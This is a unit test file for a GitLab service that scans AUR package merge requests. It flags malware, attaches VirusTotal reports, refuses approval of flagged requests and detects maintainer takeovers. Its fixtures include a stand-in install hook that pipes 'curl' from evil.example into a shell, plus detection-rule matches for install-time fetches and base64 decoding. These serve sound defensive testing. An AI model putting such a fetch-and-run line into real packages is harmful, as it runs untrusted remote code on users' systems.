import { describe, expect, it, vi } from 'vitest';
import type { MergeRequestWithDiffs } from '@chaotic-next/shared-lib';
import type { Repository } from 'typeorm';
import { DiffScanService } from '../diff-scan/diff-scan.service';
import { GitlabService } from './gitlab.service';
import { PipelineTrigger } from './pipeline-trigger.entity';
import { PIPELINE_TRIGGERED_BY_VARIABLE } from './pipeline-trigger-inputs';

const ACTOR = { userId: 'test-user', userName: 'Test User' };

function fakePipeline(id: number) {
  return {
    id,
    status: 'created',
    sha: 'def456',
    web_url: `https://gitlab.com/chaotic-aur/pkgbuilds/-/pipelines/${id}`,
  };
}

function createService(
  virustotal: { enabled: boolean; reportOn: ReturnType<typeof vi.fn> } = { enabled: false, reportOn: vi.fn() },
  aurScan: { maintainerStatusFor: ReturnType<typeof vi.fn> } = {
    maintainerStatusFor: vi.fn(async () => new Map()),
  },
): {
  service: GitlabService;
  pipelineTriggerRepository: { insert: ReturnType<typeof vi.fn> };
  pipelinesCreate: ReturnType<typeof vi.fn>;
  mrEdit: ReturnType<typeof vi.fn>;
  noteCreate: ReturnType<typeof vi.fn>;
  discussionsCreate: ReturnType<typeof vi.fn>;
  cacheSet: ReturnType<typeof vi.fn>;
  sseNext: ReturnType<typeof vi.fn>;
  vtReportOn: ReturnType<typeof vi.fn>;
  maintainerStatusFor: ReturnType<typeof vi.fn>;
} {
  const pipelinesCreate = vi.fn();
  const pipelineTriggerRepository = { insert: vi.fn() };
  const mrEdit = vi.fn().mockResolvedValue({});
  const noteCreate = vi.fn().mockResolvedValue({});
  const discussionsCreate = vi.fn().mockResolvedValue({});
  const cacheSet = vi.fn();
  const sseNext = vi.fn();

  const service = new GitlabService(
    { get: vi.fn(), set: cacheSet, del: vi.fn() } as never,
    { get: vi.fn(), getOrThrow: vi.fn().mockReturnValue(12345) } as never,
    new DiffScanService(),
    virustotal as never,
    aurScan as never,
    { sseEvents$: { next: sseNext } } as never,
    {} as Repository<never>,
    {} as Repository<never>,
    pipelineTriggerRepository as unknown as Repository<PipelineTrigger>,
    {} as Repository<never>,
  );
  (service as unknown as { chaoticId: string }).chaoticId = 'test-project-id';
  (service as unknown as { api: unknown }).api = {
    Pipelines: { create: pipelinesCreate },
    MergeRequests: { edit: mrEdit },
    MergeRequestNotes: { create: noteCreate },
    MergeRequestDiscussions: { create: discussionsCreate },
  };
  return {
    service,
    pipelineTriggerRepository,
    pipelinesCreate,
    mrEdit,
    noteCreate,
    discussionsCreate,
    cacheSet,
    sseNext,
    vtReportOn: virustotal.reportOn,
    maintainerStatusFor: aurScan.maintainerStatusFor,
  };
}

describe('GitlabService.triggerPipeline', () => {
  it('triggers the pipeline with inputs and the triggering user as CI variable', async () => {
    const { service, pipelinesCreate, pipelineTriggerRepository } = createService();
    pipelinesCreate.mockResolvedValue(fakePipeline(4711));

    const inputs = { operation: 'Bump Packages', packages: 'nodejs:20' };
    const result = await service.triggerPipeline(inputs, 'main', ACTOR);

    expect(pipelinesCreate).toHaveBeenCalledWith('test-project-id', 'main', {
      inputs,
      variables: [
        {
          key: PIPELINE_TRIGGERED_BY_VARIABLE,
          value: 'Test User (test-user)',
          variable_type: 'env_var',
        },
      ],
    });
    expect(result).toEqual({
      pipelineId: 4711,
      webUrl: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/pipelines/4711',
      status: 'created',
    });
    expect(pipelineTriggerRepository.insert).toHaveBeenCalledWith({
      ref: 'main',
      commitSha: 'def456',
      operation: 'Bump Packages',
      inputs,
      pipelineId: 4711,
      webUrl: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/pipelines/4711',
      ...ACTOR,
    });
  });

  it('does not record an audit row when the GitLab call fails', async () => {
    const { service, pipelinesCreate, pipelineTriggerRepository } = createService();
    pipelinesCreate.mockRejectedValue(new Error('GitLab unavailable'));

    await expect(service.triggerPipeline({ operation: 'None' }, 'main', ACTOR)).rejects.toThrow('GitLab unavailable');
    expect(pipelineTriggerRepository.insert).not.toHaveBeenCalled();
  });
});

function mr(overrides: Partial<MergeRequestWithDiffs>): MergeRequestWithDiffs {
  return {
    id: 1,
    iid: 1,
    title: 'chore(update): testpkg',
    state: 'opened',
    web_url: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/merge_requests/1',
    created_at: '2026-01-01T00:00:00Z',
    updated_at: '2026-01-01T00:00:00Z',
    assignees: [],
    sha: 'abc123',
    merge_status: 'can_be_merged',
    detailed_merge_status: 'not_approved',
    labels: ['human-review'],
    diffs: [],
    ...overrides,
  };
}

describe('GitlabService.autoFlagMergeRequests', () => {
  const criticalFinding = {
    ruleId: 'NPM-001',
    ruleName: 'Package manager fetch at build/install time',
    severity: 'critical',
    description: 'desc',
    file: 'testpkg/testpkg.install',
    line: 3,
    match: 'npm install atomic-lockfile',
  } as const;

  it('adds the malware label, anchors findings as line comments and posts a summary note', async () => {
    const { service, mrEdit, noteCreate, discussionsCreate, cacheSet, sseNext } = createService();
    const flagged = mr({
      diff_refs: { base_sha: 'base', head_sha: 'head', start_sha: 'start' },
      scanFindings: [criticalFinding],
    });

    await service.autoFlagMergeRequests([flagged, mr({ title: 'chore(update): cleanpkg' })]);

    expect(mrEdit).toHaveBeenCalledTimes(1);
    expect(mrEdit).toHaveBeenCalledWith('test-project-id', 1, { addLabels: 'malware' });
    expect(discussionsCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('NPM-001'), {
      position: {
        positionType: 'text',
        baseSha: 'base',
        startSha: 'start',
        headSha: 'head',
        oldPath: 'testpkg/testpkg.install',
        newPath: 'testpkg/testpkg.install',
        newLine: '3',
      },
    });
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('malware'));
    expect(flagged.labels).toContain('malware');
    expect(cacheSet).toHaveBeenCalledTimes(1);
    expect(sseNext).toHaveBeenCalledTimes(1);
  });

  it('keeps findings in the summary note when the MR has no diff refs', async () => {
    const { service, noteCreate, discussionsCreate } = createService();

    await service.autoFlagMergeRequests([mr({ diff_refs: null, scanFindings: [criticalFinding] })]);

    expect(discussionsCreate).not.toHaveBeenCalled();
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('NPM-001'));
  });

  it('skips MRs that already carry the verdict label or a stronger one', async () => {
    const { service, mrEdit } = createService();
    const warning = {
      ruleId: 'OBF-001',
      ruleName: 'Base64 decoding',
      severity: 'warning',
      description: 'desc',
      file: 'testpkg/PKGBUILD',
      match: 'base64 -d',
    } as const;

    await service.autoFlagMergeRequests([
      mr({ labels: ['human-review', 'suspicious'], scanFindings: [warning, warning] }),
      mr({ labels: ['human-review', 'malware'], scanFindings: [warning, warning] }),
    ]);

    expect(mrEdit).not.toHaveBeenCalled();
  });

  it('leaves MRs without notable findings alone', async () => {
    const { service, mrEdit, cacheSet } = createService();
    const info = {
      ruleId: 'NET-001',
      ruleName: 'Unencrypted HTTP URL',
      severity: 'info',
      description: 'desc',
      file: 'testpkg/PKGBUILD',
      match: 'http://',
    } as const;

    await service.autoFlagMergeRequests([mr({ scanFindings: [info] })]);

    expect(mrEdit).not.toHaveBeenCalled();
    expect(cacheSet).not.toHaveBeenCalled();
  });
});

describe('GitlabService.enrichVirusTotalReports', () => {
  const criticalFinding = {
    ruleId: 'DLE-001',
    ruleName: 'Curl piped into a shell',
    severity: 'critical',
    description: 'desc',
    file: 'testpkg/testpkg.install',
    line: 2,
    match: 'curl -s https://evil.example/payload | sh',
  } as const;

  const flaggedMr = (): MergeRequestWithDiffs =>
    mr({
      diffs: [
        {
          old_path: 'testpkg/testpkg.install',
          new_path: 'testpkg/testpkg.install',
          a_mode: '100644',
          b_mode: '100644',
          new_file: true,
          renamed_file: false,
          deleted_file: false,
          diff: ['@@ -0,0 +1,2 @@', '+post_install() {', '+  curl -s https://evil.example/payload | sh'].join('\n'),
        },
      ],
      scanFindings: [criticalFinding],
    });

  const maliciousReport = {
    type: 'url',
    value: 'https://evil.example/payload',
    context: 'testpkg/testpkg.install:2',
    verdict: 'malicious',
    stats: { malicious: 5, suspicious: 1, undetected: 40, harmless: 20, timeout: 0 },
  } as const;

  const enrich = (service: GitlabService, mrs: MergeRequestWithDiffs[]): Promise<void> =>
    (
      service as unknown as {
        enrichVirusTotalReports: (mrs: MergeRequestWithDiffs[]) => Promise<void>;
      }
    ).enrichVirusTotalReports(mrs);

  it('attaches reports, refreshes the cache and posts a note for notable verdicts', async () => {
    const reportOn = vi.fn().mockResolvedValue([maliciousReport]);
    const { service, noteCreate, cacheSet, sseNext } = createService({ enabled: true, reportOn });
    const flagged = flaggedMr();

    await enrich(service, [flagged]);

    expect(reportOn).toHaveBeenCalledTimes(1);
    expect(reportOn.mock.calls[0]?.[0]).toEqual([
      { type: 'url', value: 'https://evil.example/payload', context: 'testpkg/testpkg.install:2' },
    ]);
    expect(flagged.vtReports).toEqual([maliciousReport]);
    expect(cacheSet).toHaveBeenCalledTimes(1);
    expect(sseNext).toHaveBeenCalledTimes(1);
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('VirusTotal'));
  });

  it('posts only one note per MR across repeated cron cycles', async () => {
    const reportOn = vi.fn().mockResolvedValue([maliciousReport]);
    const { service, noteCreate } = createService({ enabled: true, reportOn });
    const flagged = flaggedMr();

    await enrich(service, [flagged]);
    flagged.vtReports = undefined;
    await enrich(service, [flagged]);

    expect(noteCreate).toHaveBeenCalledTimes(1);
  });

  it('skips MRs without scan findings and stays inert when no API key is configured', async () => {
    const enabled = createService({ enabled: true, reportOn: vi.fn() });
    const disabled = createService();

    await enrich(enabled.service, [mr({ title: 'chore(update): cleanpkg' })]);
    await enrich(disabled.service, [flaggedMr()]);

    expect(enabled.vtReportOn).not.toHaveBeenCalled();
    expect(disabled.vtReportOn).not.toHaveBeenCalled();
    expect(enabled.cacheSet).not.toHaveBeenCalled();
  });
});

describe('GitlabService.getOpenMergeRequests', () => {
  const mrSchema = (iid: number): Record<string, unknown> => ({
    id: iid,
    iid,
    title: `chore(update): pkg${iid}`,
    state: 'opened',
    web_url: `https://gitlab.com/chaotic-aur/pkgbuilds/-/merge_requests/${iid}`,
    created_at: '2026-01-01T00:00:00Z',
    updated_at: '2026-01-01T00:00:00Z',
    assignees: [],
    sha: 'abc123',
    labels: [],
    merge_status: 'can_be_merged',
    detailed_merge_status: 'not_approved',
    diff_refs: null,
  });

  const diffEntry = {
    old_path: 'pkg/PKGBUILD',
    new_path: 'pkg/PKGBUILD',
    a_mode: '100644',
    b_mode: '100644',
    new_file: false,
    renamed_file: false,
    deleted_file: false,
    diff: '@@ -1,2 +1,2 @@\n pkgver=1.0\n pkgrel=2',
  };

  it('fetches diffs in bounded batches and keeps going when one MR diff fails', async () => {
    const { service, cacheSet } = createService();
    const all = vi.fn().mockResolvedValue([mrSchema(1), mrSchema(2)]);
    const allDiffs = vi
      .fn()
      .mockImplementation((projectId: string, iid: number) =>
        iid === 2 ? Promise.reject(new Error('500 Internal Server Error')) : Promise.resolve([diffEntry]),
      );
    (service as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };

    const data = await service.getOpenMergeRequests(true);

    expect(allDiffs).toHaveBeenCalledTimes(2);
    expect(data[0]?.diffs).toEqual([diffEntry]);
    expect(data[0]?.scanFindings).toEqual([]);
    expect(data[1]?.diffs).toEqual([]);
    expect(data[1]?.scanFindings).toEqual([]);
    expect(cacheSet).toHaveBeenCalledTimes(1);
  });

  it('serves cached MRs without touching the GitLab API', async () => {
    const { service, cacheSet } = createService();
    const cached: MergeRequestWithDiffs[] = [mr({ title: 'chore(update): cachedpkg' })];
    (service as unknown as { cacheManager: unknown }).cacheManager = {
      get: vi.fn().mockResolvedValue(cached),
      set: cacheSet,
      del: vi.fn(),
    };
    const all = vi.fn();
    (service as unknown as { api: unknown }).api = { MergeRequests: { all } };

    const data = await service.getOpenMergeRequests(false);

    expect(data).toBe(cached);
    expect(all).not.toHaveBeenCalled();
    expect(cacheSet).not.toHaveBeenCalled();
  });

  it('reuses cached diffs and scan findings for MRs whose revision did not move', async () => {
    const { service, cacheSet } = createService();
    const firstMr = mrSchema(1);
    const secondMr = mrSchema(2);
    const all = vi
      .fn()
      .mockResolvedValueOnce([firstMr, secondMr])
      .mockResolvedValueOnce([firstMr, { ...secondMr, updated_at: '2026-01-02T00:00:00Z' }]);
    const allDiffs = vi.fn().mockResolvedValue([diffEntry]);
    (service as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };

    const first = await service.getOpenMergeRequests(true);
    const second = await service.getOpenMergeRequests(true);

    expect(allDiffs).toHaveBeenCalledTimes(3);
    expect(allDiffs).toHaveBeenNthCalledWith(1, 'test-project-id', 1);
    expect(allDiffs).toHaveBeenNthCalledWith(2, 'test-project-id', 2);
    expect(allDiffs).toHaveBeenNthCalledWith(3, 'test-project-id', 2);

    expect(second[0]?.diffs).toBe(first[0]?.diffs);
    expect(second[0]?.scanFindings).toBe(first[0]?.scanFindings);
    expect(second[1]?.scanFindings).not.toBe(first[1]?.scanFindings);
    expect(cacheSet).toHaveBeenCalledTimes(2);
  });

  it('carries VirusTotal reports and maintainer info over to a rebuilt snapshot', async () => {
    const { service, cacheSet } = createService();
    const all = vi.fn().mockResolvedValue([mrSchema(1)]);
    const allDiffs = vi.fn().mockResolvedValue([diffEntry]);
    (service as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };
    const previous: MergeRequestWithDiffs[] = [
      mr({
        vtReports: [
          {
            type: 'url',
            value: 'https://evil.example/payload',
            context: 'testpkg/testpkg.install:2',
            verdict: 'malicious',
          },
        ],
        maintainers: [
          { username: 'stranger', packagesMaintained: 1, totalVotes: 0, oldestFirstSubmitted: '', novice: true },
        ],
      }),
    ];
    (service as unknown as { cacheManager: unknown }).cacheManager = {
      get: vi.fn().mockResolvedValue(previous),
      set: cacheSet,
      del: vi.fn(),
    };

    const data = await service.getOpenMergeRequests(true);

    expect(data[0]?.vtReports).toEqual(previous[0]?.vtReports);
    expect(data[0]?.maintainers).toEqual(previous[0]?.maintainers);
  });
});

describe('GitlabService.approveMergeRequest', () => {
  it('refuses to approve MRs the scan flagged as malware', async () => {
    const { service } = createService();
    const show = vi.fn().mockResolvedValue({ iid: 1, sha: 'abc123', labels: ['human-review', 'malware'] });
    const approvalsApprove = vi.fn().mockResolvedValue({});
    (service as unknown as { api: unknown }).api = {
      MergeRequests: { show, edit: vi.fn() },
      MergeRequestApprovals: { approve: approvalsApprove },
    };

    await expect(service.approveMergeRequest(1, 'abc123', ACTOR)).rejects.toThrow('malware');
    expect(approvalsApprove).not.toHaveBeenCalled();
  });

  it('approves regular MRs and only adds the approved label', async () => {
    const { service } = createService();
    const show = vi.fn().mockResolvedValue({ iid: 1, sha: 'abc123', labels: ['human-review'] });
    const mrEdit = vi.fn().mockResolvedValue({});
    const approvalsApprove = vi.fn().mockResolvedValue({});
    const noteCreate = vi.fn().mockResolvedValue({});
    const mrActionInsert = vi.fn();
    (service as unknown as { api: unknown }).api = {
      MergeRequests: { show, edit: mrEdit },
      MergeRequestApprovals: { approve: approvalsApprove },
      MergeRequestNotes: { create: noteCreate },
    };
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: mrActionInsert };

    await service.approveMergeRequest(1, 'abc123', ACTOR);

    expect(approvalsApprove).toHaveBeenCalledWith('test-project-id', 1, { sha: 'abc123' });
    expect(mrEdit).toHaveBeenCalledWith('test-project-id', 1, { addLabels: 'approved', assigneeId: 12345 });
    expect(mrActionInsert).toHaveBeenCalledWith({
      mergeRequestIid: 1,
      action: 'approve',
      commitSha: 'abc123',
      ...ACTOR,
    });
  });
});

describe('GitlabService.enrichMaintainerInfo', () => {
  const strangerStatus = {
    maintainers: [
      {
        username: 'stranger',
        packagesMaintained: 1,
        totalVotes: 0,
        oldestFirstSubmitted: new Date().toISOString(),
        novice: true,
      },
    ],
    meta: { votes: 3, popularity: 0.5, firstSubmitted: '', outOfDate: false, orphaned: false },
    change: {
      previous: ['oldmaintainer'],
      added: ['stranger'],
      removed: ['oldmaintainer'],
      detectedAt: new Date().toISOString(),
    },
  };

  function enrich(service: GitlabService) {
    return (service as unknown as { enrichMaintainerInfo(mrs: MergeRequestWithDiffs[]): Promise<void> })
      .enrichMaintainerInfo;
  }

  it('attaches maintainers and takeover changes to update MRs', async () => {
    const maintainerStatusFor = vi.fn(async () => new Map([['evilpkg', strangerStatus]]));
    const { service, cacheSet, sseNext } = createService(undefined, { maintainerStatusFor });
    const updateMr = mr({ title: 'chore(update): evilpkg' });
    const otherMr = mr({ title: 'chore: mass rebuild', iid: 2, id: 99 });

    await enrich(service).call(service, [updateMr, otherMr]);

    expect(maintainerStatusFor).toHaveBeenCalledTimes(1);
    expect(maintainerStatusFor).toHaveBeenCalledWith(['evilpkg']);
    expect(updateMr.maintainers?.[0]?.username).toBe('stranger');
    expect(updateMr.maintainerChange?.added).toEqual(['stranger']);
    expect(otherMr.maintainers).toBeUndefined();
    expect(cacheSet).toHaveBeenCalled();
    expect(sseNext).toHaveBeenCalled();
  });

  it('skips MRs whose updated_at has not changed since the last run', async () => {
    const maintainerStatusFor = vi.fn(async () => new Map([['evilpkg', strangerStatus]]));
    const { service } = createService(undefined, { maintainerStatusFor });
    const updateMr = mr({ title: 'chore(update): evilpkg', updated_at: '2026-08-16T10:00:00Z' });

    await enrich(service).call(service, [updateMr]);
    await enrich(service).call(service, [{ ...updateMr, maintainers: undefined, maintainerChange: undefined }]);
    expect(maintainerStatusFor).toHaveBeenCalledTimes(1);

    const pushedMr = {
      ...updateMr,
      updated_at: '2026-08-16T12:00:00Z',
      maintainers: undefined,
      maintainerChange: undefined,
    };
    await enrich(service).call(service, [pushedMr]);
    expect(maintainerStatusFor).toHaveBeenCalledTimes(2);
    expect(maintainerStatusFor).toHaveBeenLastCalledWith(['evilpkg']);
  });
});
